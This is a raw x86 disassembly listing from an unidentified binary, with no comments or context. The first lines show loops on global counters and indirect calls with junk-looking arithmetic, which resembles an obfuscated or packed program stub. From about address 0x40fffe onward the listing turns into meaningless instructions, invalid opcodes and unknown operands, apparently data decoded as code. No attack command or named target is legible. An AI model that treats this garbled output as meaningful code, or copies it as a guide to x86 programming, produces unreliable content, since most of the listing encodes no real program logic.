  40ff01:	xor    ebx,ebx
  40ff03:	xor    ebx,DWORD PTR ds:0x42b196
  40ff09:	inc    ebx
  40ff0a:	mov    DWORD PTR ds:0x42b196,ebx
  40ff10:	cmp    DWORD PTR ds:0x42b196,0x15
  40ff17:	jae    0x40ff62
  40ff1d:	cmp    DWORD PTR ds:0x42b196,0x4
  40ff24:	jb     0x40ff62
  40ff2a:	jmp    0x40ff43
  40ff2f:	push   DWORD PTR [ebp-0xc]
  40ff32:	push   DWORD PTR [ebp-0x1c]
  40ff35:	push   0x42a1d7
  40ff3a:	push   DWORD PTR [ebp-0xc]
  40ff3d:	call   DWORD PTR ds:0x42b306
  40ff43:	cmp    DWORD PTR ds:0x42b196,0x3
  40ff4a:	jne    0x40ff5d
  40ff50:	mov    ebx,DWORD PTR ds:0x42b196
  40ff56:	inc    ebx
  40ff57:	mov    DWORD PTR ds:0x42b196,ebx
  40ff5d:	jmp    0x40ff01
  40ff62:	mov    edx,DWORD PTR [ebp+0x8]
  40ff65:	and    DWORD PTR ds:0x42b21a,0x0
  40ff6f:	jmp    0x40ff81
  40ff74:	mov    ebx,DWORD PTR ds:0x42b21a
  40ff7a:	inc    ebx
  40ff7b:	mov    DWORD PTR ds:0x42b21a,ebx
  40ff81:	cmp    DWORD PTR ds:0x42b21a,0x17
  40ff88:	jae    0x40ffd0
  40ff8e:	cmp    DWORD PTR ds:0x42b21a,0xe
  40ff95:	jb     0x40ffd0
  40ff9b:	jmp    0x40ffb1
  40ffa0:	push   0x42a23f
  40ffa5:	push   DWORD PTR [ebp-0x20]
  40ffa8:	push   DWORD PTR [ebp-0xc]
  40ffab:	call   DWORD PTR ds:0x42b30e
  40ffb1:	cmp    DWORD PTR ds:0x42b21a,0xd
  40ffb8:	jne    0x40ffcb
  40ffbe:	mov    ebx,DWORD PTR ds:0x42b21a
  40ffc4:	inc    ebx
  40ffc5:	mov    DWORD PTR ds:0x42b21a,ebx
  40ffcb:	jmp    0x40ff74
  40ffd0:	mov    ebx,DWORD PTR [ebp-0x58]
  40ffd3:	add    DWORD PTR ds:0x42b20e,0x42b1de
  40ffdd:	add    edx,0x5708e2
  40ffe3:	imul   edx,ebx
  40ffe6:	or     DWORD PTR ds:0x42b1b6,0x7440
  40fff0:	mov    DWORD PTR [ebp-0x58],edx
  40fff3:	sub    DWORD PTR ds:0x42b192,ecx
  40fff9:	jmp    0x412359
  40fffe:	add    al,0x23
  410000:	cld    
  410001:	shl    esp,1
  410003:	mov    al,BYTE PTR [edx]
  410005:	xchg   edx,eax
  410006:	(bad)  
  410009:	retf   0xc0da
  41000c:	mov    esp,ebx
  41000e:	aas    
  41000f:	scas   eax,DWORD PTR es:[edi]
  410010:	add    DWORD PTR [ebx-0x7c7ca1c2],0x6f
  410017:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410018:	xchg   DWORD PTR [edx+0x7c],esi
  41001b:	inc    ecx
  41001c:	mov    WORD PTR [ebp+edx*8+0x77],ss
  410020:	xor    eax,0x820dc98e
  410025:	aam    0xbe
  410027:	mov    edi,0x5fff148f
  41002c:	sar    esi,1
  41002e:	hlt    
  41002f:	mov    eax,ds:0x6055fd46
  410034:	jo     0x410054
  410036:	ret    
  410037:	sahf   
  410038:	in     eax,0xd2
  41003a:	stos   DWORD PTR es:[edi],eax
  41003b:	hlt    
  41003c:	push   0xdbe853c5
  410041:	inc    eax
  410042:	pop    es
  410043:	mov    bh,0xb1
  410045:	psrlw  mm4,QWORD PTR [ebx+ecx*1+0x53d961c6]
  41004d:	sub    BYTE PTR [ecx-0x37],al
  410050:	jo     0x410004
  410052:	or     eax,0x7177df7d
  410057:	inc    edi
  410058:	stos   DWORD PTR es:[edi],eax
  410059:	popa   
  41005a:	imul   ecx,DWORD PTR [ebx+0x5c],0xde339b2a
  410061:	xor    DWORD PTR [edi-0x23],ecx
  410064:	ss dec esp
  410066:	adc    al,0x3f
  410068:	push   esp
  410069:	imul   edx,DWORD PTR [edi],0x12
  41006c:	cli    
  41006d:	dec    edi
  41006e:	sub    al,0x37
  410070:	sub    eax,0x7eb28d7e
  410075:	(bad)  
  410076:	fadd   DWORD PTR [edi+0x3d573509]
  41007c:	sub    esi,DWORD PTR [ebx-0x26]
  41007f:	outs   dx,DWORD PTR ds:[esi]
  410080:	loope  0x410086
  410082:	dec    edx
  410083:	and    al,0xec
  410085:	pop    es
  410086:	jl     0x4100d7
  410088:	mov    edx,0x97695bb
  41008d:	mov    ebp,0x4aaae67c
  410092:	inc    ebp
  410093:	or     eax,0xa7370e36
  410098:	rol    DWORD PTR [eax],cl
  41009a:	add    bh,BYTE PTR [ebx-0x4215480d]
  4100a0:	sbb    esp,ecx
  4100a2:	or     bh,BYTE PTR [eax]
  4100a4:	pushf  
  4100a5:	aaa    
  4100a6:	sbb    ch,BYTE PTR [esi]
  4100a8:	push   esi
  4100a9:	mov    ah,0xb0
  4100ab:	add    BYTE PTR [ebp+0x32a20d38],0xd2
  4100b2:	and    eax,0x2e6a9640
  4100b7:	or     edi,DWORD PTR [ebx+0x6b026b49]
  4100bd:	retf   0x7e50
  4100c0:	fstp   st(5)
  4100c2:	add    DWORD PTR [ebx-0x5209c9f1],esp
  4100c8:	jmp    0x4100bf
  4100ca:	mov    bh,0x2
  4100cc:	dec    edx
  4100cd:	das    
  4100ce:	es or  esi,ebp
  4100d1:	adc    bl,dl
  4100d3:	sti    
  4100d4:	inc    esi
  4100d5:	popa   
  4100d6:	pop    esi
  4100d7:	pushf  
  4100d8:	repz dec edi
  4100da:	xor    ecx,DWORD PTR [edi]
  4100dc:	or     esp,eax
  4100de:	mov    ch,0xcd
  4100e0:	mov    dh,0x2f
  4100e2:	mov    ch,dl
  4100e4:	dec    eax
  4100e5:	retf   0xfa35
  4100e8:	sbb    BYTE PTR [esi],bh
  4100ea:	mov    al,0x7
  4100ec:	loope  0x4100a2
  4100ee:	(bad)  
  4100ef:	lods   al,BYTE PTR ds:[esi]
  4100f0:	adc    dh,BYTE PTR [ecx]
  4100f2:	push   ebp
  4100f3:	push   0xb
  4100f5:	pop    ebp
  4100f6:	jns    0x41013f
  4100f8:	lods   al,BYTE PTR ds:[esi]
  4100f9:	mov    esp,0x9ee53821
  4100fe:	xor    al,0x11
  410100:	scas   al,BYTE PTR es:[edi]
  410101:	std    
  410102:	aad    0xf9
  410104:	jle    0x41012c
  410106:	test   ebx,eax
  410108:	shl    dl,cl
  41010a:	loop   0x410144
  41010c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41010d:	add    eax,0xf88179ab
  410112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410113:	adc    bh,ch
  410115:	int3   
  410116:	jg     0x410129
  410118:	add    BYTE PTR [ebx-0x627811ed],bl
  41011e:	sbb    ebx,DWORD PTR [ecx+0x3ff837d2]
  410124:	lods   al,BYTE PTR ds:[esi]
  410125:	mov    bl,0x9
  410127:	pop    eax
  410128:	push   ecx
  410129:	jg     0x410113
  41012b:	lods   al,BYTE PTR ds:[esi]
  41012c:	pop    ss
  41012d:	bound  edi,QWORD PTR [ecx+edi*8-0x6ae2450f]
  410134:	std    
  410135:	js     0x4100b8
  410137:	mov    ?,esp
  410139:	sbb    BYTE PTR [edx-0x55b00fbc],bl
  41013f:	retf   
  410140:	pop    edx
  410141:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410142:	(bad)  
  410143:	jl     0x410182
  410145:	in     al,dx
  410146:	in     al,0x27
  410148:	xchg   ebx,eax
  410149:	(bad)  
  41014b:	jns    0x410138
  41014d:	or     DWORD PTR [edi-0x598c9be4],edi
  410153:	gs xor esp,ebx
  410156:	pop    ebx
  410157:	add    edi,ebp
  410159:	js     0x41015b
  41015b:	mov    ah,0x75
  41015d:	cmp    DWORD PTR [ebx],edi
  41015f:	shr    cl,0x8a
  410162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410163:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410164:	mov    al,0x9d
  410166:	fbld   TBYTE PTR [eax]
  410168:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410169:	or     eax,0x1452a629
  41016e:	mov    eax,ds:0x623c6883
  410173:	cmp    ecx,DWORD PTR [edx-0xf]
  410176:	in     al,0xda
  410178:	jl     0x41015c
  41017a:	jmp    0x2dfc:0xb296005b
  410181:	push   esi
  410182:	sete   bh
  410185:	push   ebx
  410186:	dec    edi
  410187:	cs mov ebp,0x9c585405
  41018d:	pop    eax
  41018e:	mov    ebx,0xa444a517
  410193:	fidiv  WORD PTR [ebp-0x3a61bade]
  410199:	div    ecx
  41019b:	(bad)  
  41019c:	(bad)  
  41019d:	mov    al,ds:0x312c364f
  4101a2:	cmp    eax,0x585b6830
  4101a7:	mov    esi,DWORD PTR [eax-0x2ce98118]
  4101ad:	or     DWORD PTR [eax+0x670e471c],ebp
  4101b3:	add    al,0x4d
  4101b5:	or     edi,DWORD PTR [ecx+0x3b]
  4101b8:	push   cs
  4101b9:	inc    eax
  4101ba:	push   ss
  4101bb:	cmp    BYTE PTR [esi+0x3285ee98],dh
  4101c1:	jl     0x41021f
  4101c3:	aad    0xa5
  4101c5:	cmp    al,0x93
  4101c7:	loop   0x4101ce
  4101c9:	pop    esi
  4101ca:	retf   
  4101cb:	sbb    edx,DWORD PTR [esi]
  4101cd:	test   BYTE PTR [eax+0x21],bh
  4101d0:	aam    0x94
  4101d2:	lds    ebp,FWORD PTR [ebx+0x10]
  4101d5:	push   ss
  4101d6:	cmp    ch,BYTE PTR [edx]
  4101d8:	(bad)  
  4101d9:	(bad)  
  4101da:	inc    eax
  4101db:	enter  0x331a,0x92
  4101df:	stc    
  4101e0:	lahf   
  4101e1:	call   0xfe053f8e
  4101e6:	xor    ecx,DWORD PTR [ecx]
  4101e8:	ficomp DWORD PTR [ebp+0x49cb4bb8]
  4101ee:	mov    cs,WORD PTR [edx]
  4101f0:	jmp    0x4f8e00c1
  4101f5:	adc    eax,0xb77215c4
  4101fa:	cmp    ebx,DWORD PTR [esi-0x13f0231b]
  410200:	xor    eax,0x478ddd7d
  410205:	sbb    al,0x8e
  410207:	in     al,dx
  410208:	in     eax,dx
  410209:	or     al,0xcf
  41020b:	test   eax,0x7e9adbd2
  410210:	inc    ebp
  410211:	mov    WORD PTR [edi-0x4d],?
  410214:	xor    ebx,0xb
  410217:	jmp    0x4101b2
  410219:	pop    edx
  41021a:	adc    dh,BYTE PTR [ebp+0x7e956b39]
  410220:	adc    esi,eax
  410222:	jnp    0x4101ed
  410224:	shrd   DWORD PTR [eax+0x20314fe2],ecx,0x3a
  41022c:	mov    esi,0xefd9ddbe
  410231:	dec    edi
  410232:	sbb    esi,ebp
  410234:	sub    al,0x60
  410236:	loope  0x410237
  410238:	icebp  
  410239:	js     0x410234
  41023b:	xchg   esp,eax
  41023c:	add    al,0x7
  41023e:	mov    al,0xc2
  410240:	jo     0x410289
  410242:	sub    al,0x8f
  410244:	lahf   
  410245:	ss cs loope 0x410237
  410249:	xchg   esp,eax
  41024a:	and    bl,bh
  41024c:	aas    
  41024d:	inc    edx
  41024e:	test   BYTE PTR [edi+0x622b4e1],ah
  410254:	lods   al,BYTE PTR ds:[esi]
  410255:	mov    BYTE PTR [eax],bh
  410257:	mov    cl,0xf3
  410259:	mov    bh,0xed
  41025b:	out    dx,eax
  41025c:	shl    DWORD PTR [esi+0x2],cl
  41025f:	aam    0xf9
  410261:	mov    eax,0xdde19848
  410266:	test   BYTE PTR [ebp+0xf],0x95
  41026a:	jns    0x4102e5
  41026c:	mov    ecx,DWORD PTR [ebp+0x6c]
  41026f:	cwde   
  410270:	dec    edx
  410271:	mov    ebp,0x5048cd89
  410276:	les    ecx,FWORD PTR [eax+0x2d12b40e]
  41027c:	xchg   ebp,eax
  41027d:	cli    
  41027e:	jl     0x410257
  410280:	mov    ds:0xafe3a33d,eax
  410285:	xchg   BYTE PTR [esi],ch
  410287:	mov    bl,0x66
  410289:	int3   
  41028a:	or     DWORD PTR ds:0x4c3ab47c,edi
  410290:	mov    ebx,0xe191c9d7
  410295:	call   0x1acd:0x4ac98713
  41029c:	cmp    BYTE PTR [ebp+0x13],ch
  41029f:	aaa    
  4102a0:	fs js  0x410263
  4102a3:	scas   eax,DWORD PTR es:[edi]
  4102a4:	adc    eax,0xd8c3aa
  4102a9:	mov    ch,0xd4
  4102ab:	jae    0x410272
  4102ad:	mov    ch,0x37
  4102af:	cmp    ch,bl
  4102b1:	dec    edx
  4102b2:	mov    esi,0x4c3c59a6
  4102b7:	xlat   BYTE PTR ds:[ebx]
  4102b8:	sahf   
  4102b9:	sbb    eax,0x972dfa8c
  4102be:	into   
  4102bf:	(bad)  
  4102c1:	jge    0x4102df
  4102c3:	fldenv ds:0xf6f747eb
  4102c9:	pinsrw mm5,WORD PTR [esi],0x7d
  4102cd:	shr    BYTE PTR [esi+esi*4-0x25],cl
  4102d1:	mov    ecx,0xa6635d4a
  4102d6:	xor    al,0x5d
  4102d8:	jmp    0x6e3627fe
  4102dd:	retf   0xa863
  4102e0:	mov    cl,0xb0
  4102e2:	lods   eax,DWORD PTR ds:[esi]
  4102e3:	aas    
  4102e4:	lods   eax,DWORD PTR ds:[esi]
  4102e5:	inc    ebx
  4102e6:	daa    
  4102e7:	adc    eax,0xc84319bf
  4102ec:	sahf   
  4102ed:	cmp    eax,0xddd4d2fd
  4102f2:	loopne 0x41027d
  4102f4:	scas   al,BYTE PTR es:[edi]
  4102f5:	test   eax,0x232396bb
  4102fa:	xor    al,0x59
  4102fc:	mov    eax,ds:0x76a40fa2
  410301:	and    BYTE PTR [esi+0x57],0x79
  410305:	sbb    al,0xb6
  410307:	leave  
  410308:	mov    ecx,0x6f648960
  41030d:	mov    bh,0xe0
  41030f:	lods   eax,DWORD PTR ds:[esi]
  410310:	inc    esi
  410311:	or     DWORD PTR [eax-0x46cd0458],edx
  410317:	sub    BYTE PTR [esi],ch
  410319:	ret    0xa2d1
  41031c:	mov    esi,0x9d7bb488
  410321:	mov    eax,0xe89d1c78
  410326:	pop    ebx
  410327:	mov    ebx,DWORD PTR [esi-0x3fc00f4c]
  41032d:	(bad)  
  41032e:	jp     0x410385
  410330:	sbb    eax,0xe6e2296f
  410335:	in     al,0xc2
  410337:	lea    esi,[esi+0x3d]
  41033a:	add    cl,bl
  41033c:	inc    edx
  41033d:	inc    edx
  41033e:	je     0x4102f6
  410340:	mov    dh,0x56
  410342:	xor    ebx,DWORD PTR [edx-0xc48a46d]
  410348:	jecxz  0x410357
  41034a:	jns    0x41035e
  41034c:	jl     0x4103a5
  41034e:	fbstp  TBYTE PTR [edi]
  410350:	push   ebx
  410351:	push   esi
  410352:	ins    BYTE PTR es:[di],dx
  410354:	or     BYTE PTR ds:0xc9610169,0x56
  41035b:	sub    bl,dh
  41035d:	mov    al,0x32
  41035f:	dec    ebp
  410360:	fldenv [ebx-0x42]
  410363:	imul   ebx
  410365:	fld    TBYTE PTR [esi+0x202f94ff]
  41036b:	out    dx,eax
  41036c:	and    bh,al
  41036e:	push   cs
  41036f:	retf   
  410370:	test   al,0x67
  410372:	out    0xe0,al
  410374:	or     eax,0x645a4038
  410379:	cmc    
  41037a:	ins    BYTE PTR es:[edi],dx
  41037b:	add    cl,0xb4
  41037e:	(bad)  
  41037f:	dec    edi
  410380:	loope  0x41033c
  410382:	mov    edi,0xda94d3e2
  410387:	jae    0x410392
  410389:	cmc    
  41038a:	sar    BYTE PTR [edx],0xc7
  41038d:	xchg   ebx,eax
  41038e:	mov    edx,0x18e76b76
  410393:	jae    0x410372
  410395:	pop    esi
  410396:	(bad)  
  410397:	repz pop es
  410399:	fucomip st,st(3)
  41039b:	loope  0x4103b9
  41039d:	fadd   st,st(1)
  41039f:	dec    esp
  4103a0:	sbb    dh,dh
  4103a2:	add    al,0x9f
  4103a4:	dec    eax
  4103a5:	jb     0x4103dd
  4103a7:	xchg   DWORD PTR [ebx],ebx
  4103a9:	daa    
  4103aa:	cmp    al,0x65
  4103ac:	cmp    al,0x10
  4103ae:	idiv   dl
  4103b0:	lods   eax,DWORD PTR ds:[esi]
  4103b1:	into   
  4103b2:	daa    
  4103b3:	adc    al,BYTE PTR [esi]
  4103b5:	leave  
  4103b6:	sub    edx,DWORD PTR [edx-0x4bd6220c]
  4103bc:	jmp    0x410357
  4103be:	fs cmp eax,0x50f86524
  4103c4:	jbe    0x410361
  4103c6:	arpl   WORD PTR [ecx-0x2cc9b8fd],dx
  4103cc:	xchg   ebp,eax
  4103cd:	inc    eax
  4103ce:	mov    dl,0x53
  4103d0:	test   eax,0x3f24a77d
  4103d5:	dec    esi
  4103d6:	fdivr  DWORD PTR [esi+ecx*8]
  4103d9:	rol    BYTE PTR [esi+0x4f],0xe9
  4103dd:	mov    WORD PTR [edx-0x239be453],?
  4103e3:	fdiv   QWORD PTR [edi]
  4103e5:	push   ds
  4103e6:	ja     0x41037a
  4103e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4103e9:	xor    BYTE PTR [edi+eax*1-0x80],dl
  4103ed:	jnp    0x4103d2
  4103ef:	test   eax,0xdec01e3d
  4103f4:	and    al,0x3d
  4103f6:	add    ebx,DWORD PTR ds:0xac58c1f0
  4103fc:	smsw   WORD PTR [ecx+ecx*4+0x36fc3113]
  410404:	xchg   ebx,eax
  410405:	(bad)  
  410406:	dec    eax
  410407:	out    0x61,al
  410409:	js     0x4103ef
  41040b:	adc    bl,dl
  41040d:	leave  
  41040e:	pop    edx
  41040f:	or     al,0x31
  410411:	and    BYTE PTR [edi],bh
  410413:	cmp    bh,ah
  410415:	mov    gs,eax
  410417:	sbb    cl,BYTE PTR [esi]
  410419:	pop    ebx
  41041a:	jns    0x410499
  41041c:	or     BYTE PTR [edi+0x1b13b797],al
  410422:	adc    cl,BYTE PTR [ecx]
  410424:	sub    bh,BYTE PTR [edx+0xb0c112d]
  41042a:	sbb    ecx,eax
  41042c:	or     DWORD PTR [ebx-0x56],esi
  41042f:	ret    0x307b
  410432:	rcr    DWORD PTR [esi],1
  410434:	mov    BYTE PTR [edx-0x3fe8ab41],bh
  41043a:	ins    BYTE PTR es:[edi],dx
  41043b:	xchg   esi,eax
  41043c:	mov    bh,0xc5
  41043e:	mov    edx,0xa3276e15
  410443:	pop    eax
  410444:	pop    ebp
  410445:	out    0x10,eax
  410447:	push   ecx
  410448:	xor    esp,esp
  41044a:	lock sar ecx,1
  41044d:	arpl   WORD PTR [esi-0x34],dx
  410450:	cmp    bh,BYTE PTR [ebx]
  410452:	xchg   esp,eax
  410453:	mov    WORD PTR [eax],fs
  410455:	cwde   
  410456:	gs (bad) 
  410459:	mov    ebp,DWORD PTR [edi]
  41045b:	pop    ss
  41045c:	jl     0x41044f
  41045e:	pushf  
  41045f:	jmp    0x4104c1
  410461:	je     0x41044d
  410463:	pusha  
  410464:	mov    edx,0x9cf4ed66
  410469:	sbb    eax,0xc7f922dc
  41046e:	pop    edx
  41046f:	mov    ebx,0x3c750351
  410474:	ret    
  410475:	mov    BYTE PTR [ebp+edx*1-0x5f],bh
  410479:	lock loope 0x410469
  41047c:	inc    ecx
  41047d:	xor    DWORD PTR [eiz*4-0x5ecf4615],esp
  410484:	and    esi,DWORD PTR [edx-0x6e]
  410487:	mov    ecx,0x69138ae4
  41048c:	or     al,0xe
  41048e:	pop    esp
  41048f:	inc    eax
  410490:	dec    esi
  410491:	jl     0x410491
  410493:	xor    eax,edx
  410495:	js     0x410511
  410497:	mov    esp,0x1879c3ed
  41049c:	(bad)  
  41049d:	and    al,0x75
  41049f:	shr    DWORD PTR [ebx+edi*2-0x65a6d1eb],1
  4104a6:	and    al,ch
  4104a8:	fs mov esi,0xa2aa1d81
  4104ae:	sbb    dl,BYTE PTR [ecx]
  4104b0:	retf   
  4104b1:	inc    eax
  4104b2:	sti    
  4104b3:	leave  
  4104b4:	pop    edi
  4104b5:	push   edi
  4104b6:	inc    esi
  4104b7:	shl    BYTE PTR [edx+ecx*8-0x3fe030b2],0xa1
  4104bf:	les    esi,FWORD PTR [edi+0x5e]
  4104c2:	jne    0x41048a
  4104c4:	shr    DWORD PTR [ecx+0x3255e72b],1
  4104ca:	addr16 push 0xf1ae9940
  4104d0:	inc    ebx
  4104d1:	push   cs
  4104d2:	into   
  4104d3:	shl    esi,0xb4
  4104d6:	jo     0x410494
  4104d8:	ror    DWORD PTR [ecx],0xd7
  4104db:	mov    bh,0x73
  4104dd:	push   esi
  4104de:	and    esi,DWORD PTR [edx-0x4d60dee8]
  4104e4:	enter  0x8f7c,0xfa
  4104e8:	mov    bh,0x71
  4104ea:	ds int 0x92
  4104ed:	mov    dh,0xb0
  4104ef:	push   ds
  4104f0:	rcr    BYTE PTR [edi+0x35],cl
  4104f3:	out    0xf9,eax
  4104f5:	in     eax,0x3f
  4104f7:	repz int 0xcf
  4104fa:	(bad)  
  4104fb:	neg    DWORD PTR [edx-0x19908d5e]
  410501:	pop    es
  410502:	jne    0x410524
  410504:	push   cs
  410505:	les    eax,FWORD PTR [esi]
  410507:	xlat   BYTE PTR ds:[ebx]
  410508:	inc    ebx
  410509:	xchg   edi,eax
  41050a:	stos   DWORD PTR es:[edi],eax
  41050b:	leave  
  41050c:	cmp    DWORD PTR [eax+0x54f26dc2],esi
  410512:	int    0x64
  410514:	push   edx
  410515:	test   eax,0x84f662e
  41051a:	xchg   ecx,eax
  41051b:	out    0x62,al
  41051d:	xor    ch,al
  41051f:	xchg   ecx,eax
  410520:	xor    BYTE PTR [edi+0x5b],ch
  410523:	shl    BYTE PTR ds:0xf0bbda63,1
  410529:	cmp    edi,esp
  41052b:	mov    ?,WORD PTR [eax+0x29]
  41052e:	out    dx,al
  41052f:	mov    DWORD PTR [ebp+0x4a],edi
  410532:	xchg   bp,ax
  410534:	fwait
  410535:	mov    dl,0x5a
  410537:	pop    esp
  410538:	ret    0xf27b
  41053b:	or     eax,0x92f91e4f
  410540:	dec    esp
  410541:	lahf   
  410542:	jae    0x4105b2
  410544:	and    eax,0xb839730d
  410549:	rol    BYTE PTR ds:0x28bc99cf,1
  41054f:	push   0x5932c106
  410554:	int    0x63
  410556:	fnstcw WORD PTR [esi+edi*8-0x30a0804b]
  41055d:	lods   al,BYTE PTR ds:[esi]
  41055e:	jbe    0x4105cf
  410560:	fwait
  410561:	inc    esi
  410562:	mov    al,BYTE PTR [edi+esi*2]
  410565:	or     cl,dh
  410567:	push   edi
  410568:	and    ah,bh
  41056a:	or     DWORD PTR [eax+0x49e961e4],0xffffffdf
  410571:	es addr16 nop
  410574:	add    BYTE PTR ds:0x1a4a926f,ch
  41057a:	repnz ss or cl,dl
  41057e:	test   BYTE PTR [esi+edx*4],ah
  410581:	sub    ah,bl
  410583:	jno    0x410536
  410585:	popa   
  410586:	in     al,0x25
  410588:	pop    ds
  410589:	(bad)  
  41058a:	jmp    0x6bd3aeb4
  41058f:	cdq    
  410590:	sub    BYTE PTR [edx+0x1bb92a23],0xcc
  410597:	ror    DWORD PTR [edi],0x33
  41059a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41059b:	jl     0x410554
  41059d:	call   0x96b3:0x1c324ef3
  4105a4:	dec    eax
  4105a5:	and    al,0x1e
  4105a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4105a8:	repz inc eax
  4105aa:	retf   0x3b0e
  4105ad:	out    dx,al
  4105ae:	mov    ecx,0x6d84c365
  4105b3:	inc    DWORD PTR [ecx+esi*1-0x3c]
  4105b7:	xor    BYTE PTR [edi+0x6],bh
  4105ba:	add    ebp,DWORD PTR [edx+ebp*8+0x65]
  4105be:	push   ebx
  4105bf:	sbb    BYTE PTR [edi-0x1b636c4a],al
  4105c5:	mov    bl,0x15
  4105c7:	xor    BYTE PTR [edx+0x3a],ch
  4105ca:	pop    es
  4105cb:	test   BYTE PTR [eax+0x1cdfbeee],ch
  4105d1:	push   ebp
  4105d2:	and    eax,DWORD PTR [ecx+0x45]
  4105d5:	adc    eax,0x11a2dfa9
  4105da:	mov    ebx,0x9066a761
  4105df:	ins    BYTE PTR es:[edi],dx
  4105e0:	loop   0x41058c
  4105e2:	mov    esp,0x64bf4d7b
  4105e7:	pusha  
  4105e8:	test   eax,0x8860aae0
  4105ed:	xchg   ecx,eax
  4105ee:	test   BYTE PTR gs:[edi+0xa],al
  4105f2:	jle    0x41058f
  4105f4:	fs push ecx
  4105f6:	push   ecx
  4105f7:	dec    esp
  4105f8:	and    BYTE PTR [edx-0xb],bh
  4105fb:	xor    eax,0x6fce9c30
  410600:	fucompp 
  410602:	enter  0xc92f,0xbb
  410606:	arpl   WORD PTR ds:0x1a04009d,cx
  41060c:	rcr    BYTE PTR [edx-0x3d],0x3b
  410610:	adc    BYTE PTR [edx-0x41],dl
  410613:	sbb    BYTE PTR [edx],bl
  410615:	call   0xa7b8ad96
  41061a:	pop    ds
  41061b:	imul   eax,DWORD PTR [ebp-0x601b8fa1],0xc16b0a77
  410625:	in     al,0xef
  410627:	popa   
  410628:	mov    edx,0x3e8f8a14
  41062d:	push   edi
  41062e:	jmp    0x4105e3
  410630:	push   esp
  410631:	adc    BYTE PTR [ebx+0x7b3525b9],0x2a
  410638:	outs   dx,DWORD PTR ds:[esi]
  410639:	inc    ebx
  41063a:	ins    BYTE PTR es:[edi],dx
  41063b:	inc    edx
  41063c:	push   ecx
  41063d:	push   edx
  41063e:	stos   BYTE PTR es:[edi],al
  41063f:	push   edx
  410640:	mov    ds:0x5db0bac,eax
  410645:	ins    BYTE PTR es:[edi],dx
  410646:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410647:	(bad)  
  410648:	imul   edx,DWORD PTR [ebx],0x58
  41064b:	fs mov al,0xdb
  41064e:	popa   
  41064f:	bound  ebx,QWORD PTR [edx]
  410651:	popf   
  410652:	call   0x925ae8a5
  410657:	test   BYTE PTR [eax+edx*1],0x2c
  41065b:	(bad)
  41065e:	jno    0x410663
  410660:	push   ss
  410661:	mov    ecx,ebx
  410663:	or     dh,BYTE PTR [eax-0x118c166e]
  410669:	mov    WORD PTR [eax+esi*4],?
  41066c:	mov    bl,bh
  41066e:	push   esp
  41066f:	call   0xf7abeddd
  410674:	inc    ebp
  410675:	or     eax,0xbc06c02f
  41067a:	inc    eax
  41067b:	imul   ecx,DWORD PTR [ebp+eax*4-0x2a],0x43
  410680:	enter  0xa880,0xd5
  410684:	xchg   edi,eax
  410685:	outs   dx,BYTE PTR ds:[esi]
  410686:	aad    0x14
  410688:	push   edi
  410689:	mov    ch,0xe5
  41068b:	or     DWORD PTR [ebp-0x4c],ebx
  41068e:	jns    0x41061a
  410690:	mov    bh,0x2
  410692:	jmp    0x410641
  410694:	(bad)  
  410695:	neg    DWORD PTR [eax-0x204ccc62]
  41069b:	xchg   ecx,eax
  41069c:	loop   0x4106d9
  41069e:	call   0x16a4ee69
  4106a3:	pop    ss
  4106a4:	inc    edi
  4106a5:	xchg   esp,eax
  4106a6:	add    edx,DWORD PTR [esi+0x67]
  4106a9:	ror    DWORD PTR [ebp+0x47],1
  4106ac:	cmp    DWORD PTR [ecx-0x3c14fed9],ebx
  4106b2:	sar    ecx,1
  4106b4:	jecxz  0x4106bf
  4106b6:	data16 jl 0x4106af
  4106b9:	es mov dh,0x96
  4106bc:	jg     0x4106f6
  4106be:	cmp    eax,DWORD PTR [esi+0x19731e26]
  4106c4:	stc    
  4106c5:	jmp    0xa868818
  4106ca:	add    cx,cx
  4106cd:	add    ch,ah
  4106cf:	push   es
  4106d0:	call   0x31ec74b0
  4106d5:	adc    al,ah
  4106d7:	test   edx,edx
  4106d9:	mov    al,ds:0xb4093810
  4106de:	mov    eax,ds:0xee18c124
  4106e3:	jne    0x41075c
  4106e5:	mov    bh,0x35
  4106e7:	sbb    eax,0x8ae3a8cc
  4106ec:	test   DWORD PTR [eax-0x40],esp
  4106ef:	xor    al,0x49
  4106f1:	jnp    0x41071c
  4106f3:	add    eax,0xb39a34fd
  4106f8:	aaa    
  4106f9:	loopne 0x410731
  4106fb:	pusha  
  4106fc:	jne    0x410718
  4106fe:	and    DWORD PTR [ecx+ecx*4+0x6900923d],eax
  410705:	inc    edx
  410706:	stos   DWORD PTR es:[edi],eax
  410707:	pop    edi
  410708:	sub    BYTE PTR [edx],dl
  41070a:	retf   0x289b
  41070d:	xchg   DWORD PTR [eax-0x1cd94b8a],ebp
  410713:	sbb    ch,BYTE PTR [edi-0x3]
  410716:	sbb    BYTE PTR [esi-0x39],cl
  410719:	jmp    0x9419b963
  41071e:	pop    eax
  41071f:	(bad)  
  410720:	push   ebp
  410721:	mov    esi,cs
  410723:	out    dx,al
  410724:	data16 mov dh,0xc6
  410727:	cdq    
  410728:	ss std 
  41072a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41072b:	jmp    0x4e61491
  410730:	dec    esp
  410731:	adc    eax,0x287bed38
  410736:	sahf   
  410737:	lods   eax,DWORD PTR fs:[esi]
  410739:	pop    ebp
  41073a:	sub    ecx,esp
  41073c:	pusha  
  41073d:	scas   al,BYTE PTR es:[edi]
  41073e:	test   BYTE PTR [ebx-0x4215f3fe],0x10
  410745:	dec    ebp
  410746:	(bad)  
  410747:	xor    esi,ecx
  410749:	rol    edx,cl
  41074b:	iret   
  41074c:	dec    esi
  41074d:	sub    esi,DWORD PTR [esi]
  41074f:	xchg   esp,eax
  410750:	je     0x4106e0
  410752:	add    BYTE PTR [eax+0x6],dl
  410755:	(bad)  
  410756:	fcmovne st,st(7)
  410758:	mov    dl,0x62
  41075a:	push   ebx
  41075b:	or     ch,BYTE PTR ds:0x3562e135
  410761:	(bad)  
  410762:	call   0x7ed3:0x18eff9cd
